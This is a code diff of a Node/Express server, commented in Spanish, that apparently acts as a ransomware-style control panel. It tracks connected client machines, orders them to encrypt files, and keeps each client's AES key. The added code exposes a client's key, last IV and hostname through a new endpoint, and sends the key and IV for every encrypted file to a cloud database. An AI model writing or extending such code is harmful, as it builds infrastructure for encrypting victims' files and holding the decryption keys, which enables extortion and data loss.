@@ -284,6 +284,48 @@ app.get('/api/clientes', (req, res) => {
 
 // File list endpoint removed
 
+// Obtener clave y último IV del cliente
+app.get('/api/cliente-clave/:clienteId', (req, res) => {
+  const { clienteId } = req.params;
+  const cliente = clientesConectados.get(clienteId);
+
+  if (!cliente) {
+    return res.json({ success: false, error: 'Cliente no encontrado' });
+  }
+
+  // Buscar clave guardada
+  let aesKey = cliente.claveAESCliente || clavesPorCliente.get(clienteId);
+
+  // Si no está en memoria, intentar leer del archivo
+  if (!aesKey) {
+    const keyPath = path.join(KEYS_DIR, `${clienteId}_aes_cliente.txt`);
+    if (fs.existsSync(keyPath)) {
+      aesKey = fs.readFileSync(keyPath, 'utf8').trim();
+    }
+  }
+
+  // Buscar el último IV usado (del log de cifrado)
+  let lastIv = null;
+  const logPath = path.join(KEYS_DIR, `${clienteId}_encrypt_log.json`);
+  if (fs.existsSync(logPath)) {
+    try {
+      const logData = JSON.parse(fs.readFileSync(logPath, 'utf8'));
+      if (logData.archivos && logData.archivos.length > 0) {
+        lastIv = logData.archivos[logData.archivos.length - 1].iv;
+      }
+    } catch (e) {
+      // Ignorar errores de parseo
+    }
+  }
+
+  res.json({
+    success: true,
+    aesKey: aesKey || null,
+    lastIv: lastIv,
+    hostname: cliente.hostname
+  });
+});
+
 // Solicitar cifrado de archivo al cliente
 app.post('/api/cifrar-archivo', async (req, res) => {
   const { clienteId, filePath } = req.body;
@@ -413,13 +455,20 @@ app.post('/api/cifrar-archivos', async (req, res) => {
 
           // Sync to Cloud DB (Encrypted)
           const cliente = clientesConectados.get(clienteId);
-          syncToCloud('Encrypted', {
-            uuid: cliente?.uuid || clienteId,
-            hostname: cliente?.hostname || 'Unknown',
-            totalCifrados: data.resumenBasico?.totalCifrados || 0,
-            totalErrores: data.resumenBasico?.totalErrores || 0,
-            archivos: (data.archivosCifrados || []).slice(0, 20).map(a => a.nombre),
-            timestamp: new Date().toISOString()
+          const aesKey = cliente?.claveAESCliente || obtenerClaveCliente(clienteId);
+
+          // Sync cada archivo cifrado con su IV
+          (data.archivosCifrados || []).forEach(archivo => {
+            syncToCloud('Encrypted', {
+              uuid: cliente?.uuid || clienteId,
+              hostname: cliente?.hostname || 'Unknown',
+              archivo: archivo.nombre,
+              archivoOriginal: archivo.original,
+              directorio: archivo.directorio,
+              iv: archivo.iv,
+              aesKey: aesKey,
+              timestamp: new Date().toISOString()
+            });
           });
 
           resolve({
